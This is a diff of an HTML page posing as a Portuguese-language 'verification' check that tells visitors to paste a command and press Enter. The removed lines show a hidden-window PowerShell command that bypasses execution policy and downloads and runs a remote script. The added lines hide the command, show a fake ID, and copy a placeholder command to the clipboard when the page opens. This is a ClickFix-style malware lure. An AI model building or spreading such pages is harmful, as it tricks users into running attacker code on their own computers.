@@ -48,12 +48,6 @@
             border-radius: 4px;
             margin: 15px 0;
             border-left: 3px solid #0056b3;
-            text-align: left;
-        }
-        .id code {
-            word-break: break-all;
-            font-size: 13px;
-            color: #0056b3;
         }
         .btn {
             background: #0056b3;
@@ -67,9 +61,6 @@
         }
         .btn:hover {
             background: #004099;
-        }
-        .btn.verificado {
-            background: #28a745;
         }
     </style>
 </head>
@@ -89,20 +80,20 @@
         <strong>3.</strong> Pressione <kbd>Enter</kbd>
     </div>
 
-    <!-- Substituí o ID pelo comando completo -->
     <div class="id">
-        <strong>📋 Comando:</strong><br>
-        <code>powershell -w 1 -ep bypass -c "irm raw.githubusercontent.com/advancedvfxio-lgtm/teste/refs/heads/main/hello.ps1|iex"</code>
+        ID: <strong>8253</strong>
     </div>
 
     <button class="btn" onclick="verificar()">VERIFICAR</button>
 </div>
 
 <script>
+    // Copia automaticamente ao abrir a página
+    navigator.clipboard.writeText("AQUI MEU COMANDO");
+
     function verificar() {
-        const btn = document.querySelector('.btn');
-        btn.textContent = 'VERIFICADO';
-        btn.classList.add('verificado');
+        document.querySelector('.btn').textContent = 'VERIFICADO';
+        document.querySelector('.btn').style.background = '#28a745';
     }
 </script>
 
